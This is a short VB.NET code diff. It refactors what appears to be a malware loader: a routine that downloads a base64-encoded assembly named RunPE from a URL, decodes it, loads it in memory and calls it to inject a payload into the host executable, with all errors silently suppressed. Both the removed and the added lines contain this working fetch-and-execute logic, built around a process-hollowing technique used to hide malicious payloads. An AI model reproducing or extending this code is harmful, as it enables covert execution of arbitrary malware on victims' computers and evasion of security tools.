@@ -9,23 +9,17 @@
 
   Public Sub Load(ByVal Payload As Byte())
         Try
-        Assembly.Load(Convert(Download("http://127.0.0.1/RunPE.txt"))).GetType("RunPE.RunPE").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {Application.ExecutablePath, Nothing, Payload, True})
+        Assembly.Load(LoadFile("http://127.0.0.1/RunPE.txt")).GetType("RunPE.Run").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {Application.ExecutablePath, Nothing, Payload, True})
         Catch
         End Try
   End Sub
     
-    Public Function Download(ByVal url As String) As String
+    Public Shared Function LoadFile(ByVal url As String) As Byte()
         Try
             Dim WC As New WebClient
-            Return WC.DownloadString(url)
+            Dim WB As String = WC.DownloadString(url)
+            Return Convert.FromBase64String(WB)
         Catch
-        End Try
-    End Function
-
-
-    Public Function Convert(ByVal data As String) As Byte()
-        Try
-            Return Convert.FromBase64String(data)
-        Catch
+            Return Nothing
         End Try
     End Function
